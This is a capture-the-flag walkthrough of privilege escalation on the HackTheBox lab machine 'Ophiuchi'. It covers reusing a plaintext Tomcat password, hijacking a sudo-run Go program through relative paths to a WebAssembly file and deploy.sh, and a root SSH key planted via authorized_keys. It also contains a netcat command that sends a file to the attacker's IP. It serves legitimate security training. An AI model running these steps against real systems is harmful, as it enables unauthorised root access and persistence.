# Privilege Escalation

- We can run linpeas and see there are two users : admin and root. admin has the user flag and root has the root flag.

## admin
- Our default directory is /opt/tomcat
- There is a file /conf/tomcat-users.xml
- There are creds, we can try for the manager directory --> admin:whythereisalimit
![[Pasted image 20210403061901.png]]
- We are able to login
- ![[Pasted image 20210403061953.png]]
- We can try the same for the user admin `su admin` and provide the password.
![[Pasted image 20210403062050.png]]
- We can cat out the user.txt from admin's home directory.

## root
- We can run `sudo -l` and see that we can run see that we can run go on index.go (with absoulte paths given) as sudo
```bash
admin@ophiuchi:/tmp$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go

```

- Checking the file, we are reading the binary (as ReadBytes function is used) of the main.wasm and then checking for info (maybe some sort of dictionary). If "info" is 1 we are running deploy as sh, and because we can run it as sudo, we will get privilege escalation in this case. 
```go
func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}

```

- Running it as sudo, output : `Not ready to deploy`.
- This must be because the file doesn't have "info" set as "1". But we cannot change main.wasm in this directory nor deploy.
- Unlike go and index.go, main.wasm and deploy.sh don't have their absolute paths set, therefore we can create our own main.wasm and deploy.sh in our home directory and the those files will be used.
- First we need to find resources which can decompile and recompile the file.
- We can download the files on our local system by running `nc -lnvp 9002 > main.wasm` on our local and `cat main.wasm | nc 10.10.14.5 9001` (already checked nc is present on the box). Just to be sure, we can check the `md5sum` on both the files.
- We find this GitHub repository : https://github.com/webassembly/wabt, which has an online demo.
- So WASM is web assembly language, which can run on modern browsers using JS for loading the module.
- So the repository has hosted two websites one to convert this from binary-to-text (https://webassembly.github.io/wabt/demo/wasm2wat/) and then text-to-binary (https://webassembly.github.io/wabt/demo/wat2wasm/).
- We can go through the whole rigamarole of downloading, building... but this is easier.
- So we first upload the binary to convert it to text form.
```
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 0))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))

```
- We can see the function "info" is setting the value of the const. as 0, therefore we weren't able to enter the else part of the codem, which ran 'deploy.sh'.
- We can change this 0 --> 1 and copy this over to the sibling site, and download the generated binary.
- Download this binary to the home directory of admin
- Create a blank deeploy.sh, just to test we have reached the else part of the code.
```bash
admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy

admin@ophiuchi:~$ ls
deploy.sh  main.wasm  user.txt
admin@ophiuchi:~$ 

```

- Now we can just use deploy.sh to gain root shell, or just the root.txt
- I have just generated a RSA key pair `ssh-keygen -f root_op`
- Then in deploy.sh
```bash
#!/bin/bash
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuGgxEOvrxJPpF0USye7uumOLcX+hGEBHJDKaOj10ioBCIcnPe5JC0gusdlahWXg1ut4GkGJDbaTk+iU+B4mtQMlc4Ddb7d4TDWalw6w1PGBPQPru+9fqd6grYTw3X146rJeyBkTm9SuXguKzdhKJOM628UZJdPhilWDRmdhf3l30P4+g6PXpHiQXr0cc+OpqrMDunFPzc8+DjrNMrZnFfM+XzVecF+3Y5NlEPUrLwkw+ffDS2Vgp61+NA1+HJX99WNrlEo3npu3O+IpN+70zeMw5ZpaAsixZUUz3AVqjST2kc/aJam2JpTf/QipuyH7bLb5prFSytpLnAromw9A7vZjmRvziRbrcVKgX0xSkyfF8gkSRLEqa7cgSs1zfS4ZxvufhkUcsrJKqHleBA85OZ7gNIh+vKphKF1nQ/qDOPnSapI+g0dZtnTBVZky1Mo2G2TGms8eDxelBREkQkrf3faaY82uH5iTx1BJi5vlg8bndIre1hLukypnYKAYgPPBM= norman@kali >> /root/.ssh/authorized_keys
```
- Run `sudo /usr/bin/go run /opt/wasm-functions/index.go`
- Open another terminal and login using the private key
```bash
ssh -i ssh/roo_op root@10.10.10.227                                                                
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)                                                                           
                                                                                                       
 * Documentation:  https://help.ubuntu.com         
 * Management:     https://landscape.canonical.com 
 * Support:        https://ubuntu.com/advantage                                                        
                                                                                                       
  System information as of Sat 03 Apr 2021 10:47:03 AM UTC                                                            
                                                           
  System load:             0.0                                                                                        
  Usage of /:              19.9% of 27.43GB                                                                           
  Memory usage:            12%                                                                         
  Swap usage:              0%                              
  Processes:               222                                                                                        
  Users logged in:         1                                                                           
  IPv4 address for ens160: 10.10.10.227                                                                                                                               
  IPv6 address for ens160: dead:beef::250:56ff:feb9:2610                                                                                                                                         
176 updates can be installed immediately.                                          
56 of these updates are security updates.                                                                                                                             
To see these additional updates run: apt list --upgradable
                                                                             
The list of available updates is more than a week old.                                                                                    
To check for new updates run: sudo apt update                        
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                     
                                                   

Last login: Fri Feb  5 17:51:32 2021                                 
root@ophiuchi:~# ls
go  root.txt  snap
root@ophiuchi:~#                                 

```
- We can cat out root.txt